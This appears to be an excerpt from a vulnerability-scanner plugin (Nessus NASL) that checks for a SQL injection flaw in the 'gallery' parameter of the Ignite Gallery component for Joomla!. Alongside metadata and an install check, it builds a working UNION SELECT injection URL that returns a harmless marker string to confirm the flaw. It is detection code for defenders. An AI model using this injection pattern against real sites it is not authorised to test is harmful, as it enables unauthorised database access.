...
if (description)
{
  ...
  script_xref(name:"EDB-ID", value:"6723");
  script_xref(name:"SECUNIA", value:"32240");

  script_name(english:"Ignite Gallery Component for Joomla! 'gallery' Parameter SQLi");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Ignite Gallery component for Joomla! running on the
remote host is affected by a SQL injection vulnerability in
ignitegallery.php due to improper sanitization of user-supplied input
to the 'gallery' parameter before using it to construct database
...
database.");
  script_set_attribute(attribute:"see_also", value:"https://www.ignitegallery.com/");
...
if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>Ignite Gallery<');
  checks["/administrator/components/com_ignitegallery/ignitegallery.xml"]=regexes;
...
magic = SCRIPT_NAME - ".nasl" + " works!";
exploit = "concat(";
for (i=0; i<strlen(magic); i++)
   exploit += hex(ord(magic[i])) + ",";
exploit[strlen(exploit)-1] = ")";
exploit = "-1+UNION+SELECT+1,2," + exploit + ",4,5,6,7,8,9,10+--+";

url = "/index.php?option=com_ignitegallery&task=view&gallery=" + exploit;
